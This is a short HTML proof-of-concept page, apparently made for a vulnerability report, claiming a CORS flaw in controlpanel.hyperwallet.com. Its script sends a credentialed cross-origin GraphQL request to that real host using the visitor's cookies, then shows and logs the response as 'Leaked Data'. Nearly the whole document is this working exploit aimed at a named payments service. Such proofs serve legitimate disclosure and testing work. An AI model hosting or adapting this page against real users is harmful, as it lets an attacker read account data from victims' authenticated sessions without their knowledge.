<!DOCTYPE html>
<html>
<head><title>SOP Bypass Proof</title></head>
<body style="font-family: sans-serif; padding: 20px;">
    <h2 style="color: red;">CORS Vulnerability: controlpanel.hyperwallet.com</h2>
    <p><strong>Status:</strong> <span id="status">Testing...</span></p>
    <div id="result" style="background: #222; color: #0f0; padding: 15px; border-radius: 5px; overflow-x: auto;"></div>

    <script>
        const target = "https://controlpanel.hyperwallet.com/graphql";
        
        fetch(target, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ query: "{ __schema { types { name } } }" })
        })
        .then(response => {
            document.getElementById('status').innerText = "Vulnerable (Read Access Granted)";
            return response.text();
        })
        .then(data => {
            // This displays the leaked data on the screen
            document.getElementById('result').innerText = data;
            console.log("Leaked Data:", data);
        })
        .catch(err => {
            document.getElementById('status').innerText = "Failed: " + err;
        });
    </script>
</body>
</html>
